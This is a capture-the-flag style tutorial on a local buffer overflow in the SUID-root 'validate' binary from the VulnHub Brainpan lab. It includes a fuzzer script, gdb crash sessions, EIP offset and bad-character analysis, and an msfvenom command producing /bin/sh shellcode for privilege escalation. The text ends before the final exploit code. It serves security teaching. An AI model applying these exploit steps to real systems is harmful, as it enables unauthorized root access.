# Local Buffer Overflow
Have you found a Linux ELF binary that shows signs of homebrew and is SUID to root? Let's analyze the `/usr/local/bin/validate` file from the Brainpan lab exercise from VulnHUB.com

## Bring it on Home
First, we need to bring the binary back to our attacker machine for analysis. We can do so two different ways that are descibed in the [Data Exfiltration Infiltration](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/data-exfiltration-infiltration.md) cheat sheet in the Grimoire. We do this so that we can easilt analyze the binary using forensics tools that the compromised host might not have installed. 

Ensure that the binary was successfully transferred without corruption by using the `md5sum` command on the binary at the compromised Target system and compare it to the md5sum of the binary on your local Attacker machine.
```
root@attacker-machine:~# md5sum validate
9e7865f1e663529db5d8b1ecb7118490  validate
```
```
user@target-machine:~$ md5sum validate
9e7865f1e663529db5d8b1ecb7118490  validate
```
## File Command
The #1 step for binary analysis on our Attacker system is to run the `file` command. The output of this command is valuable in ensuring,
1. What type of file we have, in our case ELF 32-bit
2. Which libraries/interpreters are required for the binary to execute, in our case was , `/lib/ld-linux.so.2`

So, to get [`/lib/ld-linux.so.2`](https://packages.debian.org/stretch/libc6-i386) installed on our local Attacker system, we will need the `libc6-i686` package.
```
root@attacker-machine:~# apt install libc6-i386
```
## Strings
The #2 step to analyzing a binary is to use the `strings command`. Strings will prvide us with more clues, in our case we see,
```
usage %s <input>
validating input...
passed.
```
So, we know that the application does handle input.
### Fuzz it
Next, we simply pass the application input in increasing sizes until we get it to Segmentation Fault. I wrote a nice little script that will determnine the buffer size for us below. Simply pass the binary's name, n our case `validate`, as an argument.
```
#!/bin/bash
# Standard In C program fuzzer
# 2019 WeakNet Labs, Douglas Berdeaux
buf="" # this will be the buffer overflow
appname=$1 # pass to me the app name
while [ 1 ]
 do
  buf+="A"
  #printf "[*] buf is now: $buf\n";
  seg=$(./${appname} $buf || echo "0x031337" | egrep "0x031337"| wc -l)
  if [[ "$seg" == "1" ]]
   then
    printf "[!] Segmentation Fault Successful! ($(echo -n $buf|wc -m)) bytes.\n"
    exit;
  fi
done;
```
and the output,
```
root@attacker-machine:~# ./stdin-fuzz.sh validate
[!] Segmentation Fault Successful! (112) bytes.
root@attacker-machine:~#
```
The length of `112` bytes crashed our program, but we probably need (at least 4) more bytes to overwrite EIP. To find out how many extra bytes we need, we will use `create_pattern.rb` module from the Metasploit Framework as so,
```
/infose/exploitation/metasploit-framework/tools/exploit/pattern_create.rb -l 144 # added 32 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7
```
Start `validate` with the GNU Debugger, `gdb` as so,
```
root@attacker-machine:~# gdb validate 
Reading symbols from validate...done.
gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7
Starting program: /root/Penetration Testing/VulnHUB/Brainpan/files/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd1b8 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7")
EBX: 0x41366441 ('Ad6A')
ECX: 0xffffd540 ("5Ae6Ae7")
EDX: 0xffffd241 ("5Ae6Ae7")
ESI: 0x2 
EDI: 0xf7fbd000 --> 0x1b2db0 
EBP: 0x64413764 ('d7Ad')
ESP: 0xffffd230 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7")
EIP: 0x39644138 ('8Ad9')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x39644138
[------------------------------------stack-------------------------------------]
0000| 0xffffd230 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7")
0004| 0xffffd234 ("e1Ae2Ae3Ae4Ae5Ae6Ae7")
0008| 0xffffd238 ("2Ae3Ae4Ae5Ae6Ae7")
0012| 0xffffd23c ("Ae4Ae5Ae6Ae7")
0016| 0xffffd240 ("e5Ae6Ae7")
0020| 0xffffd244 ("6Ae7")
0024| 0xffffd248 --> 0x8048500 (<validate+76>:	call   0x8c048503)
0028| 0xffffd24c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x39644138 in ?? ()
gdb-peda$ quit
root@attacker-machine:~#  /infosec/exploitation/metasploit-framework/tools/exploit/pattern_offset.rb -q 39644138
[*] Exact match at offset 116
root@attacker-machine:~#  
```
We can see that the EIP was overwritten with, 39644138, which we validated the location in the buffer string to be `116` using the `pattern_offset.rb` Metsplaoit Ruby module.

## Verify Control over EIP
To verify control over EIP, let's overwrite it with "ABCD." First we will create a new buffer string using a simple Python one-liner script as so,
```
python -c 'print "A" * 116 + "ABCD" + "B" * (200-116-4)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```
I chose the total size of 200 bytes simply to pad our overflow. We will need space for our NOP sled and shell code. Let's pass this as an argument to `validate` using the GNU Debugger like so,
```
root@attacker-machine:~# gdb validate
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Reading symbols from validate...done.
gdb-peda$ run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Starting program: /root/Penetration Testing/VulnHUB/Brainpan/files/validate AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd188 ('A' <repeats 117 times>, "BCD", 'B' <repeats 80 times>)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd540 ("BBBBBBB")
EDX: 0xffffd249 ("BBBBBBB")
ESI: 0x2 
EDI: 0xf7fbd000 --> 0x1b2db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd200 ('B' <repeats 80 times>)
EIP: 0x44434241 ('ABCD')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x44434241
[------------------------------------stack-------------------------------------]
0000| 0xffffd200 ('B' <repeats 80 times>)
0004| 0xffffd204 ('B' <repeats 76 times>)
0008| 0xffffd208 ('B' <repeats 72 times>)
0012| 0xffffd20c ('B' <repeats 68 times>)
0016| 0xffffd210 ('B' <repeats 64 times>)
0020| 0xffffd214 ('B' <repeats 60 times>)
0024| 0xffffd218 ('B' <repeats 56 times>)
0028| 0xffffd21c ('B' <repeats 52 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x44434241 in ?? ()
gdb-peda$ 
```
There's our chippy. We see that EIP is overwritten with, "ABCD" with the output line in GDB as: `EIP: 0x44434241 ('ABCD')`.
## Find a Register to Control
In the case of validate, we can overwrite the EAX register as shown in the GDB output above,
```
EAX: 0xffffd188 ('A' <repeats 117 times>, "BCD", 'B' <repeats 80 times>)
```
This means that we need to first search for a call or jump to EAX within the validate binary using `objdump`. Objdump will translate the hex bytes into CPU instructions an we can simply gre for the call or jump command like so,
```
root@attacker-machine:~# objdump -d validate | egrep -i '(jmp|call).*eax'
 8048468:	ff 14 85 14 9f 04 08 	call   *0x8049f14(,%eax,4)
 80484af:	ff d0                	call   *%eax
 804862b:	ff d0                	call   *%eax
```
Great, we have a `call` Assembly instruction that we can use at address `0x80484af`. 
## Search for Bad Characters
To search for bad characters for the binary's input, use GNU Debugger again. But first, we need to create a new input string. We take our current string, `python -c 'print "A" * 116 + "ABCD" + "B" * (200-116-4)'` and remove the 'B' bytes and replace them with the new string that we create with the following command,
```
root@attacker-machine:~# for num in $(seq 1 255); do printf "\\\x%02x" $num; done
```
This creates the string, 
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Run GNU Debugger with `validate` and pass along the input as,
```
run $(python -c "print 'A' * 116 + 'ABCD' + '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'")
```
Next, issue the following GDB command to analyze the registers. 
```
gdb-peda$ x/100x $eax
0xffffd0c8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0d8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0e8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd0f8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd108:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd118:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd128:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd138:	0x41414141	0x44434241	0x04030201	0x08070605
0xffffd148:	0x00000000	0xf7e38a4b	0xf7fbd3dc	0x08048204
```
Look for our new bytes, that will be `01,02,03,04,05,...ff` in hexadecimal. Remember, because of littel-endian, they will bre represented in opposite order in each address location. For instance, `0x01,0x02,0x03,0x04` will be `0x04030201`. Once we find our string, search to the end, `ff` looking for NULL memory address values. If found, that meas that we have a bad character. For instance, above we have,
```
0xffffd138:	0x41414141	0x44434241	0x04030201	0x08070605
0xffffd148:	0x00000000	0xf7e38a4b	0xf7fbd3dc	0x08048204
```
Our new byte string starts at `0x04030201` and continues to `0x08070605` (read backwards would be 01,02,...08). The next memory location holds NULL bytes, `0x00000000` - now we know that `09` is a bad character. So, remove `\x09` from our new byte string and rerun the input. Repeat the analysis process and then repeat the whole process until we have no full NULL memory address values and a list of bad characters.

`\x09\x0a\x10\x46`
At one point during this process, the application ran successfuly, but said 
```
validating input...failed: 46
```
This means that '`\x46` is a bad character. 

## Generate our Paylod
Since this is a local prviliege escalation exploit, no reverse shell is needed. This means that we can use the payload, `/linux/x86/exec`. Any command that we get executed will run as the `root` user because of the SUID permissions. Let's use MSFVenom to create this shell code for us,
```
/infosec/exploitation/metasploit-framework/msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x10\x46' -f py
```
## Create Exploit Code
Now, we are ready to create our local privilege escalation exploit code for the vulnerable `validate` application.
